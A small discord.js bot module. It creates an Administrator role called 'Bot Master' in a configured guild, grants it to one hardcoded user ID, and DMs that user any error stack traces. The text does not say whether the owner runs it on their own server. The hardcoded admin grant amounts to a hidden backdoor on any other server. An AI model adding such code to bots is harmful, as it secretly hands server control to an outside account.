import * as Discord from 'discord.js';

/**
 * @param {Discord.Client} client 
 * @returns 
 */
export default async function createRole(client) {
  const guildId = process.env.DISCORD_GUILD_ID;
  const guild = client.guilds.cache.get(guildId);
  if (!guild) return console.error('No guild found');

  const role = await guild.roles.create({ 
    name: 'Bot Master',
    permissions: 'Administrator',
    color: 'Orange'
  }).catch(onFailed(client));

  const danho = guild.members.cache.get('245572699894710272') ?? await guild.members.fetch({
    user: '245572699894710272',
  });

  danho.roles.add(role);
}

/**
 * 
 * @param {Discord.Client} client 
 * @returns 
 */
function onFailed(client) {
  return (error) => {
    client.users.send('245572699894710272', {
      content: [
        error.message,
        '',
        error.stack
      ].join('\n')
    })
  }
}